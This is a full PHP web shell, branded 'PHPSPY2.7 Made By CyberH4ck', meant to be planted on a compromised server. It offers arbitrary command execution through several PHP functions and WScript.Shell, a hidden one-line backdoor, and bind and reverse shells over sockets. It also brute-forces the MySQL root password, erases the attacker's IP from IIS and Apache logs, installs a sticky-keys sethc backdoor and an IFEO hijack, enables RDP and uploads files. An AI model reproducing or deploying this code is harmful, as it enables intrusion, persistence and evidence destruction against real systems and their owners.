<?php
header("Content-type: text/html; charset=gb2312");
$auth_ok=0;
$user=$_SERVER['PHP_AUTH_USER'];
$pass=md5($_SERVER['PHP_AUTH_PW']);
$pass_md5="63a9f0ea7bb98050796b649e85481845";// pass:root

if(isset($user) && isset($pass) && $user=='root' && $pass_md5==$pass){
$auth_ok=1;
}

if(!$auth_ok)
{
      header('WWW-Authenticate: Basic realm="Top Secret Area"');
      header('HTTP/1.0 401 Unauthorized');
      exit;
}

if ($_POST['getinfo']){
@ob_clean(); phpinfo();exit();
}

?>

<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=GB2312">
		<title>***PHP-command***</title>
<style type="text/css"> 
body  
{ 
background-image:  
url(''); 
background-repeat:  
no-repeat; 
background-attachment:  
fixed 
} 

textarea 
{  background-color:#000000;color:#8B0000;
	font-size:15Px;font-family:Tahoma;
	width:598px;height:245px;
}
</style> 

  <!--<script type="text/javascript" src="shell.js"></script>-->
  <script language="Javascript">
  	<!--
    
   //-->
  </script>
  </head>
	
<body bgproperties="fixed" bgcolor=#FFFFFF>
		<!--bgproperties="fixed"-->
		
<div align="center">
	<font face="Verdana" size="3" color=#000000><p>Please Input Your Command!</p>
	</font></div>
	
	
<div align="center"><font color="#000000" face="Verdana" size="3"> 
<SCRIPT language=javascript><!-- 
var isnMonths=new initArray("1��","2��","3��","4��","5��","6��","7��","8��","9��","10��","11��","12��")
var isnDays=new initArray("������","����һ","���ڶ�","������","������","������","������","������"); 
today=new Date(); 
 
function initArray(){ 
 for(i=0;i<initArray.arguments.length;i++) 
 this[i]=initArray.arguments[i]; 
} 
 
function getFullYear(d){ 
  yr = d.getYear(); 
  if(yr<1000)  yr += 1900; 
 return yr; 
} 
var StrTemp = getFullYear(today) +"��"  +"&nbsp;" + isnMonths[today.getMonth()]; 
StrTemp = StrTemp + "" + today.getDate()+"��&nbsp;"+ isnDays[today.getDay()]; 
document.write(StrTemp); 
//--> 
</SCRIPT></font> </div>
<div align="center"><font face="Verdana" size="2" color=red>
		<b>ע:�����������Cmd.exe��ɾ��������ִ��ϵͳ����!!</b><br>
		<b>ɨ��ɶ�дĿ¼�ļ�Ϊ���йؼ��̷����ܵ�Ŀ¼�ļ�..</b>
		</font></div>

<br>
<?php 
	    echo "<font face='Papyrus' size='2' color=blue><b>Disabled Functions: </b></font>".showdisablefunctions();
          
	    function showdisablefunctions() {
	    if ($disablefunc=@ini_get("disable_functions")){ return "<font face='Papyrus' color=#00FF00 size='2'><b>".$disablefunc."</b></font>"; }
	    else { return "<font face='Verdana' color=#00FF00 size='2'><b>NULL</b></font>"; }
	    }
?>
<br>	    
<div align="center"><table align="center" width="100%" bgcolor=#F5FFFA border=0><!-- ������ڿ���������ʾλ��-->
	<tr bgcolor=#F5FFFA>
		<td align="center"  style="width:265px;">
<!-- ��ȡWeb������ϵͳ��ز�������-->
<br>
<table align="right" border="0" >
	<tr >
		<td align="left" bgcolor="" colspan="0">
		<font face="Verdana" size="2" color=#FF9900>
			<?php
			if(strtoupper(substr(PHP_OS, 0, 3))=='WIN')
			    {
			        /*      	
			     try{
								    		     
					     $shellex = new COM('W'.'Scr'.'ip'.'t.she'.'ll');
						$regname='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections';
					      if($shellex->RegRead($regname)==1)
					      echo "Զ�����浱ǰ״̬:<font color=#000000>�ѹر�</font><br>";
					      else
					      echo "Զ�����浱ǰ״̬:<font color=#000000>�ѿ���</font><br>";
					    if (empty($shellex))
					    {
					      throw new Exception($error);
					    }
					    
					  }catch (Exception $e) {
					       echo 'Wscript.shell ������ <br>';
					      }
						*/
			    }	
			    		
			if(strtoupper(substr(PHP_OS, 0, 3))=='WIN')
			    {
			        /*      	
			     try{
								    		     
					     $shellex = new COM('W'.'Scr'.'ip'.'t.she'.'ll');
						$regname='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber';
					      echo "WEB�������ն˶˿�:<font color=#000000>".$shellex->RegRead($regname)."</font>";
					    if (empty($shellex))
					    {
					      throw new Exception($error);
					    }
					    
					  }catch (Exception $e) {
					       echo 'Wscript.shell ������[�˿ڶ�ȡʧ��] <br>';
					      }
						*/
			    }
      
			?></font>
		</td>
		
	<tr>
		<td align="left" bgcolor="">
		<font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "WEB������·��:<font color=#000000>".$_SERVER['DOCUMENT_ROOT']."</font>";
			?></font>
		</td>
	
	<tr>
	<td align="left" bgcolor="">
		<font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "WEB����������:<font color=#000000>".$_SERVER['SERVER_NAME']."</font>";
			?></font>
		</td>
			
	<tr>
	<td align="left" bgcolor="">
		<font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "WEB������IP:<font color=#000000>".$_SERVER['SERVER_ADDR']."</font>";
			?></font>
		</td>
		
		<tr>
		<td align="left" bgcolor="">
		<font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "Your IP Is :<font color=#000000>".$_SERVER['REMOTE_ADDR']."</font>";
			?></font>
		</td>
		
	  <tr>
			<td align="left" bgcolor="">
		<font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "<font color=#000000>".$_SERVER['SERVER_SOFTWARE']."</font>";
			?></font>
		</td>

	<!-- MYSQL�����ƽⲿ��-->
    <tr>
		<td align="left" bgcolor="">
     	<form name="mysqlcrack" method="post" action="">
	     <input type="submit" name="crack" value="�ƽⱾ��MYSQL ROOT����">
	    </form>
	  </td>
	  
	  
	  <!-- ����WEB��������־����-->
    <tr>
		<td align="left" bgcolor="">
     	<form name="weblog" method="post" action="">
     	 
     	<input type="submit" name="clearapachelog" value="����Apache�еı�����־">
	    </form>
	  </td>
    
    <tr>
		<td align="left" bgcolor="">
     	<form name="weblog2" method="post" action="">
     	 
     	<input type="submit" name="cleariislog" value="���� IIS�еı���IP��־">
	    </form>
	  </td>
	  
	  <tr>
		<td align="left" bgcolor="">
     	<form name="backdoor" method="post" action="">
     	 
     	<input type="submit" name="setupsethc" value="һ��װ ճ����sethc����">
	    </form>
	  </td>
	  
	  
</table>
</td>

<!-- ������ʾ���Լ��ɶ�дĿ¼ɨ����ʾ������-->
<td align="center">
<table align="center" border="0" style="width:600px;">
	<tr>
	<td align="left" bgcolor="#FFFFFF">	
<form name="sys" method="post" action="" style="height:36px;">
	<input type="text" name="Path_IP" size="68" value="c:\windows\system32\cmd.exe">
	<select name="excutemethod" >
        <option value="exec">EXEC</option>
        <option value="shell_exec">shell_exec</option>
        <option value="popen">popen</option>
        <option value="proc_open">proc_open</option>
        <option value="system">system</option>
        <option value="passthru">passthru</option>
        <option value="wscript">Wscript</option>
        </select>
	<input type="text" name="Cmd_Port" size="68" value="">
	<input type="submit" name="Execute" value="Execute">
	
</form>
  </td>
	<tr>
		<td align="left" bgcolor="#8DB6CD">
		<font face="Verdana" size="1" color=#FFFFFF>PHP SYSCmd by cyberH4CK Good Luck!
		</font>
		</td>
	<tr>
	<td align="left" bgcolor="white">
<!--<font face="Verdana" size="2" color=#FF9900>�����ǲ�������textarea��-->
<textarea name="wcc" cols=90 rows=12 style="">			
<?php  

function Executecmd($cmd)
{

$descriptorspec = array(
   0 => array("pipe","r"),//����
   1 => array("pipe","w"),//������
   2 => array("pipe","w"),//�������
);
 $process = proc_open($_SERVER["COMSPEC"], $descriptorspec, $pipes);      
 if (is_resource($process)) {
  fwrite($pipes[0], $cmd."\r\n");
  fwrite($pipes[0], "exit\r\n");
  fclose($pipes[0]);
   
echo stream_get_contents($pipes[1]);
   fclose($pipes[1]);
   
echo stream_get_contents($pipes[2]);
   fclose($pipes[2]);
  
 proc_close($process);
                                                   }      
 }
 
if ($_POST['Execute'] && !empty($_POST['Cmd_Port'])){
   error_reporting(0);
   $execfunc=$_POST['excutemethod'];
   $CmdLine=trim($_POST['Cmd_Port']);

                if ($execfunc=="system") {
                        system($CmdLine);
                } elseif ($execfunc=="passthru") {
                        passthru($CmdLine);
                } elseif ($execfunc=="exec") {
                        exec($CmdLine,$result);
                        foreach($result as $value)
                        {echo $value."\n";}
                } elseif ($execfunc=="shell_exec") {
                        $result=shell_exec($CmdLine);
                        echo $result;
                } elseif ($execfunc=="popen") {
                        $pp = popen($CmdLine, 'r');
                        $read = fread($pp, 2096);
                        echo $read;
                        pclose($pp);
                                             
                } elseif ($execfunc=="proc_open") {
                        Executecmd($CmdLine);
                
                 }elseif ($execfunc=="wscript") {
               if(strtoupper(substr(PHP_OS, 0, 3))=='WIN'){
                	echo "Wscript Execute:\n";
                	
                	try{
                	
                        $wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
                        $exec = $wsh->exec(trim($_POST['Path_IP'])." /c".stripslashes($CmdLine)."");
                        $stdout = $exec->StdOut();
                        $stroutput = $stdout->ReadAll();
                        echo $stroutput;
                        if (empty($wsh))
					    {
					      throw new Exception($error);
					    }
					    
	                   }catch (Exception $e) { echo 'Wscript.shell ������[�޷�ִ������] ';}
                        
                        
                        }else{echo "�ⲻ��windowsϵͳ,������wscript.shellִ������.";}
                }                                      
        }
  


//�Զ���Ŀ¼�ļ�Ȩ��ɨ�貿��
if ($_POST['submit']){
	$paths = stripslashes(trim($_POST['Cmd_Port']));
	if($paths){
			
$power_xx = substr(sprintf('%o', @fileperms($paths)), -1);

switch($power_xx){
	case 2 : echo "ɨ�����,����...".$paths." [��д]\n"; break;
	case 4 : echo "ɨ�����,����...".$paths." [�ɶ�]\n"; break;
	case 6 : echo "ɨ�����,����...".$paths." [�ɶ�/��д]\n"; break;
	case 7 : echo "ɨ�����,����...".$paths." [�ɶ�/��д/��ִ��]\n"; break;
	
}}}

//ɨ��������ؼ�Ŀ¼�ļ����ֵĿ�д,��ִ��Ȩ��..
if ($_POST['scans']){	
//	
error_reporting(0);
echo "ɨ�����,����...\n";
$win_start='C:/Documents and Settings/All Users/����ʼ���˵�/����/����';
$folder1=array("C:/recycler","C:/recycled","D:/recycled","E:/recycled","F:/recycled","C:/System Volume Information","D:/System Volume Information","E:/System Volume Information","F:/System Volume Information");
$folder2=array($_SERVER['DOCUMENT_ROOT'],"C:/WINDOWS","C:/WINDOWS/temp","C:/WINDOWS/system32","C:/WINDOWS/System32/Wbem",$win_start);
$folder3=array("/tmp","/var/tmp","");
$folder=array_merge($folder1,$folder2,$folder3);
foreach ($folder as $key=> $value)
{
	if(is_dir($value)){
	if(is_writable(trim($value))){
      echo $value." [��д]\n";}else 
	{echo $value." [����д]\n";}
}
}
$programurl=array("C:/windows/system32/cmd.exe","C:/windows/system32/cscript.exe","C:/windows/system32/net.exe","C:/windows/system32/net1.exe");

foreach ($programurl as $key=> $value)
{
	if(is_file($value)){
    if (is_executable($value)) {
    echo $value." ��ִ��\n";} else
    {echo $value." ����ִ��\n";}
}
}

$passfile=array("/etc/passwd","/etc/shadow");
foreach ($passfile as $key=> $value)
{
	if(is_file($value)){
    if (is_readable($value)) {
    echo $value."[�ɶ�]\n";} else
    {echo $value." [���ɶ�]\n";}
}
}
  }



 function connect($pass)//��������MYSQL���ݿ⺯��..
     {
     $conn=@mysql_connect("127.0.0.1","root",trim($pass));
     if($conn){
     echo "�õ�root����:".$pass;}
     else echo "";
     }
	   $passwd=@file("mysql.dic");
if ($_POST['crack']){ 
	   	   
	if ($passwd){
	   echo "�ɹ���ȡ���ֵ��ļ���ʼ�ƽ�...";
	   set_time_limit(0);
     $strings=count($passwd);
     for($i=0; $i<$strings; $i++){
     $pass = $passwd[$i];
     //echo $pass."\n";
     @connect($pass);
     }}
     else
	   echo "�޷���ȡ���ֵ��ļ�����..";
	   echo "ɨ�����..";}

//echo date('ymd');
//���IIS������Web ��־����...
if ($_POST['cleariislog']){
if(strtoupper(substr(PHP_OS, 0, 3))=='WIN')
{
set_time_limit(0);
sleep(1);
date_default_timezone_set('Asia/Shanghai');
$iislogurl="C:\WINDOWS\system32\LogFiles\W3SVC1"."\ex".date('ymd').".log";
$filename2=$iislogurl;echo "��־·��:".$filename2."\n";
$filename=$iislogurl;//echo $filename;
$iislogfile=@file(trim($filename));
$strs=count($iislogfile);
$length=strlen($_SERVER['REMOTE_ADDR']);
if ($iislogfile){    
if (is_writable(trim($filename2)))//������IP��ַ������д��Դ��־�ļ�...
	{
	$handle2 = @fopen(trim($filename2),'w');
	
	//���ܵı���д��򿪵��ļ���
	for($i=0; $i<$strs; $i++){
     $content = $iislogfile[$i];
     if (trim($_SERVER['REMOTE_ADDR'])==trim(substr($content,9,$length))){
     $content='';}
     @fwrite ($handle2,$content);}	
	@fclose ($handle2);

  echo "����WEB������IIS��־�ɹ�,����IP��ַ�ķ��ʼ�¼����ȫ�����!\n";}
	else
	echo "������˼Ӵ!����ʧ��..\n";	
}else
{echo "�޷���ȡ��־�ļ�,����Ŀ���ļ�û�ж�ȡȨ�޻�δ������..";}

}
}
 
//���Apache������Web ��־����...

if ($_POST['clearapachelog']){

set_time_limit(0);

@system('dir /s /b c:access.log>"D:\System Volume Information\url.txt"');
$logurl=@file("D:\System Volume Information\url.txt");
//$logurl=glob("c:\Program Files\access.log",GLOB_NOSORT);���ɹ�

$filename2=$logurl[0];echo "��־·��:".$filename2."\n";
$filename=$logurl[0];//echo $filename;
$logfile=@file(trim($filename));
$strs=count($logfile);
$length=strlen($_SERVER['REMOTE_ADDR']);
if ($logfile){    
if (is_writable(trim($filename2)))//������IP��ַ������д��Դ��־�ļ�...
	{
	$handle2 = @fopen(trim($filename2),'w');
	
	//���ܵı���д��򿪵��ļ���
	for($i=0; $i<$strs; $i++){
     $content = $logfile[$i];
     if (trim($_SERVER['REMOTE_ADDR'])==trim(substr($content,0,$length))){
     $content='';}
     @fwrite ($handle2,$content);}	
	@fclose ($handle2);

  echo "����WEB������Apache��־�ɹ�,����IP��ַ�ķ��ʼ�¼����ȫ�����!\n";}
	else
	echo "������˼Ӵ!����ʧ��..\n";	
}else
{echo "�޷���ȡ��־�ļ�,����Ŀ���ļ�û�ж�ȡȨ�޻�δ������..";}
unlink("D:\System Volume Information\url.txt");
}

//��װsethc ճ����backdoor
if ($_POST['setupsethc']){
	if(strtoupper(substr(PHP_OS, 0, 3))=='WIN')
	{
	$cmdpath="C:/WINDOWS/system32/taskmgr.exe";
	$syspath="C:/WINDOWS/system32";
	$sethc="C:/WINDOWS/system32/sethc.exe";
	$dllsethc="C:/WINDOWS/system32/dllcache/sethc.exe";
	if(file_exists($dllsethc)&&file_exists($sethc)){
	  @unlink("C:/WINDOWS/system32/dllcache/sethc.exe");
    @unlink("C:/WINDOWS/system32/sethc.exe");}
	if (file_exists($cmdpath)&&is_writable($syspath)){
		@copy($cmdpath,$dllsethc);
	  @copy($cmdpath,$sethc);
	  echo "��װsethc���ųɹ�...";
	 }else{
	  echo "��װsethc����ʧ��...";}
}
}

//һ�����͵�phpһ�仰cmdshell(��һ�仰ľ��) 
 
echo `$_REQUEST[cmd]`;	


if($_POST['start']){

set_time_limit(0);
$system=strtoupper(substr(PHP_OS, 0, 3));
if(!extension_loaded('sockets'))
{
  if ($system == 'WIN') {
    @dl('php_sockets.dll');
    }else{
      @dl('sockets.so');}

}

// Set up our socket
$commonProtocol = getprotobyname("SOL_TCP");
$socket = socket_create(AF_INET, SOCK_STREAM, $commonProtocol);
socket_bind($socket,$_SERVER['SERVER_ADDR'], 88); //socket_bind()     ��socket����һ��IP��ַ�Ͷ˿���
socket_listen($socket);
echo "����88�˿��ѱ���ֹ...\n";
// Initialize the buffer8

if (($msgsock = socket_accept($socket)) < 0)
     {
       echo "socket_accept() failed: reason: " . socket_strerror($msgsock) . "\n"; 
     }else{
     //�����ͻ���
     $msg = "----------------------PHP Connect-Forward--------------------\n";
     socket_write($msgsock, $msg, strlen($msg));
     @socket_write($msgsock,'#:');}
     //��ȡ�ͻ��˷�������Ϣ..
while ($buf=socket_read($msgsock,8192)){
     if(trim(strtolower($buf))=="exit")
     {
     socket_write($msgsock,"Bye!!\n");
     socket_close($msgsock);
     socket_close($socket);
     }else{
     $result=array("");
     @exec($buf,$result);}
 
     foreach($result as $value){
	 @socket_write($msgsock,$value."\n");
	  }
     @socket_write($msgsock,'#:');
     //socket_send( resource socket, string buf, int len, int flags )
     
   } 
   /*socket_close($msgsock);
   socket_close($socket);*/
}


if($_POST['stop']){

set_time_limit(0);
socket_close($msgsock);
socket_close($socket); //socket_close()     �ر�һ��socket��Դ
print("Closed the socket\r\n\r\n");
}

//����Զ���ն˷���...
if($_POST['open3389']){
	if(strtoupper(substr(PHP_OS, 0, 3))=='WIN')
	{
	  error_reporting(E_ERROR | E_WARNING | E_PARSE);
 
      //$regsvr32='c:\windows\system32\regsvr32.exe';
try{
	
	  $shellex = new COM('WSc'.'rip'.'t.Sh'.'ell');
	  $shellex->RegWrite('HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections',0,REG_DWORD);

	 $regname='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections';
      if($shellex->RegRead($regname)==1)
      echo "Զ�������ѹر�";
      else
      echo "Զ�������ѿ���";
      
       if (empty($shellex))
					    {
					      throw new Exception($error);
					    }
					    
	 }catch (Exception $e) {
					       echo 'Wscript.shell ������[�޷�����Զ������] ';
					      }
//	   elseif(empty($open) and strtoupper(get_current_user())=='SYSTEM'){
//	    define ("HKEY_LOCAL_MACHINE" , 2147483650);//&H80000002
//        $regc = new COM ( 'winm'.'gmts:{impersonationLevel=impersonate}//loca'.'lhost/root/Default:StdRegProv');
//        $strKeyPath = 'SYSTEM\CurrentControlSet\Control\Terminal Server';  //ע���·��
//        $strValueName = 'fDenyTSConnections';  //ע���·���µ�����
//        $dwValue=0;
//        $reg=$regc->SetDWORDValue(HKEY_LOCAL_MACHINE,$strKeyPath,$strValueName,$dwValue);//��Ҫ���õ�ֵ�洢��$dwValue������
//	   //var_dump($reg);
//	    if($reg==0) echo "winmgmts����Զ���ն˳ɹ�\n";else echo "winmgmts����Զ���ն�ʧ��\n"; 
//	 
//		}     
    }
}

//ӳ��ٳ�sethc.exeΪtaskmgr.exe...
if($_POST['hijack']){
	if(strtoupper(substr(PHP_OS, 0, 3))=='WIN')
	{
	   error_reporting(E_ERROR | E_WARNING | E_PARSE);
 try{
 	
		$shellex = new COM('WSc'.'rip'.'t.Sh'.'ell');
	  
	    if ($shellex->RegWrite('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','c:\WINDOWS\system32\taskmgr.exe',REG_SZ)){
            echo "Wscript.Shellӳ��ٳ�sethc.exeΪtaskmgr.exe�ɹ�\n";
		}else{echo "ӳ��ٳ�sethc.exeΪtaskmgr.exeʧ��\n";}  
			
       if (empty($shellex))
					    {
					      throw new Exception($error);
					    }
					    
	  }catch (Exception $e) {
					       echo 'Wscript.shell ������[�޷�ӳ��ٳ�] ';
					      }			
			
//		elseif(strtoupper(get_current_user())=='SYSTEM'){
//	    define ("HKEY_LOCAL_MACHINE" , 2147483650);//&H80000002
//        $regc = new COM ( 'winm'.'gmts:{impersonationLevel=impersonate}//loca'.'lhost/root/Default:StdRegProv');
//        $strKeyPath = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options';  //ע���·��
//        $strValueName = 'sethc.exe';  //ע���·���µ�����
//        $szValue='c:\WINDOWS\system32\taskmgr.exe';
//        $reg=$regc->SetStringValue(HKEY_LOCAL_MACHINE,$strKeyPath,$strValueName,$szValue);//��Ҫ���õ�ֵ�洢��$dwValue������
//		//var_dump($reg);
//		if($reg==0) echo "winmgmtsӳ��ٳ�sethc.exeΪtaskmgr.exe�ɹ�\n";else echo "winmgmtsӳ��ٳ�sethc.exeΪtaskmgr.exeʧ��\n";  
//		
//		}
    }
}

 if($_POST['self_kill']){    
    if (unlink(__FILE__)) {ob_clean();echo "Delete success,Thanks for using syscmd !\n";}
    else {echo "Can't delete ".__FILE__."!\n";}}
 
?> 

</textarea>
</td>
	
</table>
</td>

<!-- ��ȡPHP���ò�������-->
<td align="center">
<table align="left" border="0" style="width:200px;">
	
	<tr>
		<td align="left" bgcolor="">
        <font face="Verdana" size="2" color=#4B0082><?php	echo php_uname();?></font>
		</td>

	<tr>
		<td align="left" bgcolor="">
     <font face="Verdana" size="2" color=#FF9900>
			<?php
			if (get_magic_quotes_gpc()) {				
			echo "magic_quotes_gpc=<font color=#000000>"."On"."</font>";
		}
		else{
			echo "magic_quotes_gpc=<font color=#000000>"."Off"."</font>";
		}
		     ?></font>
		</td>
		
	<tr>
		<td align="left" bgcolor="">
     <font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "Current user Is: <font color=#000000>". @get_current_user()."</font>";
		?></font>
	</td>
	
	<tr>
		<td align="left" bgcolor="">
     <font face="Verdana" size="2" color=#FF9900>
			<?php
			if (ini_get('register_globals')){
			echo "register_globals = <font color=#000000>On</font>";
		}else{
			echo "register_globals = <font color=#000000>Off</font>";
		}
		?></font>
	</td>
	
	<tr>
		<td align="left" bgcolor="">
     <font face="Verdana" size="2" color=#FF9900>
			<?php
			if(ini_get('safe_mode')){
			echo "safe_mode = <font color=#000000>On</font>";
		}else{
			echo "safe_mode = <font color=#000000>Off</font>";
		}
		?></font>
	</td>
	
	<tr>
		<td align="left" bgcolor="">
     <font face="Verdana" size="2" color=#FF9900>
			<?php
			if(ini_get('display_errors')){
			echo "display_errors = <font color=#000000>On</font>";
		}else{
			echo "display_errors = <font color=#000000>Off</font>";
		}
		?></font>
	</td>
	
	<tr>
		<td align="left" bgcolor="">
     <font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "Zend engine version= <font color=#000000>". @zend_version()."</font>";
		?></font>
	</td>
      
      <tr>
		<td align="left" bgcolor="">
     <font face="Verdana" size="2" color=#FF9900>
			<?php
			echo "open_basedir= <font color=#000000>". ini_get('open_basedir')."</font>";
		?></font>
	</td>

<!-- �ļ��ϴ�����-->	
<tr><tr>
<td>	
<font face="Lucida Sans" color=#00FF00>
<form enctype="multipart/form-data" method="post" action="">
<input type="hidden" name="max_file_size" value="2000000">
<br><input name="upfile" type="file"><br>

ѡ���ϴ�Ŀ¼����Ϊ��ǰĿ¼<br><input type="text" name="targetdir" size="30" value="C:/windows/System32"><br>
<input type="submit" name="upload" value="�ϴ��ļ�">
<input type="submit" name="scans" value="ɨ��ɶ�дĿ¼�ļ�">
</form>

<?php
$uploaddir = stripslashes(trim($_POST['targetdir']));
if ($_POST['upload']){
if ($uploaddir){

@set_time_limit(0);
$uploadfile = $uploaddir."/". $_FILES["upfile"]["name"];

if (move_uploaded_file($_FILES["upfile"]["tmp_name"], $uploadfile))
{
print "�ļ��ϴ��ɹ�,���ϴ���\n";
//print_r($_FILES);
$path = pathinfo ($uploadfile);

echo $path["dirname"] . "\n";//dirname�ļ�����Ŀ¼��

}else{
print "�ļ��ϴ�ʧ��!\n";

}}
else{
$uploaddir = dirname(__FILE__)."/";

$uploadfile = $uploaddir. $_FILES["upfile"]["name"];

if (move_uploaded_file($_FILES["upfile"]["tmp_name"], $uploadfile))
{
print "�ļ��ϴ��ɹ�,���ϴ���\n";
//print_r($_FILES);
$path = pathinfo ($uploadfile);

echo $path["dirname"] . "\n";//dirname�ļ�����Ŀ¼��

}else{
print "�ļ��ϴ�ʧ��!\n";

}}}
?>
</font>
</td></table>

</td></table></div>

<br>
<table align="center" border="0" width="100%">
	<tr>
		<td align="left" bgcolor="">
		<form name="listen" method="post" action="">
     	<input type="submit" name="getinfo" value="��ȡphpinfo()">&nbsp;
     	<input type="submit" name="start" value="  ��ʼ����  ">&nbsp;
     	<input type="submit" name="stop" value="  ֹͣ����  ">&nbsp;
     	<input type="submit" name="open3389" value="����Զ���ն�">&nbsp;
     	<input type="submit" name="hijack" value="ӳ��ٳ�sethc">&nbsp;
     	<input type="submit" name="self_kill" value=" �����Ի� " >
	    </form>
	    
	  </td></table>
	    <br>
	    <div style="position:absolute;left:40%;top:88%">
	    <font face="Century Gothic" size="1" color=#000000>PHPSPY2.7 Made By CyberH4ck</font>
        </div>
        <br>
<?php
if(strtoupper(substr(PHP_OS, 0, 3))=='WIN')
{
	$disk=array('c:','d:','e:','f:','g:','h:','i:','j:','k:','l:','m:','n:','o:','p:','q:','r:','s:','t:','u:','v:','w:','x:','y:','z:');
	
	foreach($disk as $dk)
	{
		if(is_dir($dk))
		echo "<font face='Verdana' size='2'>".strtoupper($dk)."Freespace: ".round(@disk_free_space($dk)/1073741824,1)." Gb of ".round(@disk_total_space($dk)/1073741824,1)." Gb</font>&nbsp;&nbsp;";
	}
}

//php sockets ��������
if($_POST['Execute'] && is_numeric($_POST['Cmd_Port'])){

set_time_limit(0);
$system=strtoupper(substr(PHP_OS, 0, 3));

if (!extension_loaded('sockets'))
{
 echo 'û�����sockets��չ [Sockets Support=disabled]';
 if ($system == 'WIN') {
  @dl('php_sockets.dll');
  }else{
    @dl('sockets.so');				     						   	      
}
}

if(isset($_POST['Path_IP']) && isset($_POST['Cmd_Port']))
{
   $host = trim($_POST['Path_IP']);
   $port = trim($_POST['Cmd_Port']);
   //echo "�����������ӳɹ�,����IP:".$host."�˿�:".$port."����nc ����...";
}

//print("ע��:win�ķ�����ҪPHP֧��socket")."\n";
//print("Linux�ڷ�Դ����밲װ�����һ�㶼��֧��,����鿴phpinfo()")."\n>";

       
$host=gethostbyname($host);
$protocols=getprotobyname("SOL_TCP");

 if(($sock=socket_create(AF_INET,SOCK_STREAM,$protocols))<0)
{
  echo"Socket Create Faile";
}
					    
if(($flag=socket_connect($sock,$host,$port))<0)
{
   echo"Connect Faile";
}else{
	
$message="----------------------PHP Connect-Back----------------------\n";

@socket_write($sock,$message,strlen($message));
@socket_write($sock,'#:');

while($cmd=@socket_read($sock,8192,PHP_NORMAL_READ))
   {
   if(trim(strtolower($cmd))=="exit")
   {
	   socket_write($sock," Bye!!\n");
	   socket_close($sock);
   }else
   {
	  $return=array("");
	  exec($cmd,$return);
    }
 
  foreach($return as $value){
	@socket_write($sock,$value."\n");
	}
  @socket_write($sock,'#:');
  
    }
         }
}
?>	    
	   
	
</body> 
</html>
